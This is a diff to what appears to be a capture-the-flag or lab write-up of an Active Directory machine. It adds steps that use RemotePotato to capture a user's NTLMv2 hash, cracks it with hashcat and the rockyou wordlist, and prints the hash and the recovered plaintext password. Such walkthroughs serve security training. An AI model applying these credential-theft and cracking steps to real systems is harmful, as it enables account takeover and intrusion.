@@ -620,7 +620,7 @@ Now ill re-ingest the data!
 
 I can see there is a user that has a session i can use remotepotato to steal the users NTLM hash
 
-# RemotePotato leads ti
+# RemotePotato leads to user compromise
 
 ```python
 python3 -m http.server 8000
@@ -667,3 +667,20 @@ NTLMv2 Hash	: j.dillon::NOVACART:11f76ab02945f33a:630cb863d5b9e362b8b157fa8ce476
 ```
 Now i have the NTLMv2 hash for the user `j.dillon`
 
+## Cracking the hash
+
+```python
+hashcat j-dillon.hash /usr/share/wordlists/rockyou.txt
+
+J.DILLON::NOVACART:11f76ab02945f33a:630cb863d5b9e362b8b157fa8ce476f8:0101000000000000bdb3611da5d9dc01b7704f2138f6881300000000020010004e004f00560041004300410052005400010004004400430004001c006e006f007600610063006100720074002e006c006f00630061006c0003002200440043002e006e006f007600610063006100720074002e006c006f00630061006c0005001c006e006f007600610063006100720074002e006c006f00630061006c0007000800bdb3611da5d9dc01060004000600000008003000300000000000000001000000002000006448886a2f8b67717d7f26147e821e872bab76dfd3218aef2b4b5bf514b9039d0a00100000000000000000000000000000000000090000000000000000000000:novafire2008
+```
+The hash cracked
+
+```python
+j.dillon:novafire2008
+```
+Ill validate these credentials
+
+```python
+
+```
